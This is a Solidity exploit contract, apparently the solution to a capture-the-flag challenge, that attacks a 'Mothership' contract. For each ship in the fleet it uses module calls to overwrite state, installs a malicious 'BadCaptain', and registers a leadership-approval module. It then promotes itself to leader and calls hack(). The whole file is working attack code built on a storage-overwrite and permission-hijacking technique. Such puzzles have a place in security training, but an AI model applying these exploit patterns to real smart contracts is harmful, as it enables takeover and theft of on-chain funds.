// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../Mothership.sol";

contract MothershipAttacker {
    Mothership public victim;
    event log(address);

    constructor(address _victimAddress) {
        victim = Mothership(_victimAddress);
    }

    function attack() external {
        BadCaptain lastCaptain;

        for (uint256 i = 0; i < victim.fleetLength(); i++) {
            lastCaptain = new BadCaptain();

            SpaceShip spaceship = victim.fleet(i);

            CleaningModule(address(spaceship)).replaceCleaningCompany(
                address(0)
            );

            RefuelModule(address(spaceship)).addAlternativeRefuelStationsCodes(
                uint256(uint160(address(this)))
            );

            spaceship.askForNewCaptain(address(lastCaptain));

            lastCaptain.approveLeader(spaceship);
        }

        lastCaptain.becomeLeader(victim);
    }

    function isLeaderApproved(address) external pure {}
}

contract BadCaptain {
    address leader;

    constructor() {
        leader = msg.sender;
    }

    function becomeLeader(Mothership victim) external {
        victim.promoteToLeader(address(this));
        victim.hack();
    }

    function approveLeader(SpaceShip victim) external {
        victim.addModule(
            LeadershipModule.isLeaderApproved.selector,
            msg.sender
        );
    }

    function isLeaderApproved(address _leader) external view {
        if (_leader != leader) {
            revert();
        }
    }
}
